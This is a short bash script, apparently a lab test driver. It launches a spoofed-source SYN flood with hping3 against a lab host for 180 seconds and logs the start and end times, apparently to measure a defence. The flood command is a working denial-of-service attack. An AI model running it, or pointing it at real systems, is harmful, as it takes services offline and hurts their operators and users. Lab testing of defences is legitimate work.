#!/usr/bin/env bash
# S3 reference driver. Isolated lab only. Requires CAP_NET_RAW.
set -euo pipefail
TARGET=edge-01.lab; PORT=8443
echo "attack_onset_s=$(date +%s.%N)" | tee -a run.log
# 25,000 pps, 120-byte SYN packets, randomised sources, for 180 s.
timeout 180 hping3 --flood --syn --rand-source -d 120 -p "$PORT" "$TARGET" || true
echo "attack_end_s=$(date +%s.%N)" | tee -a run.log
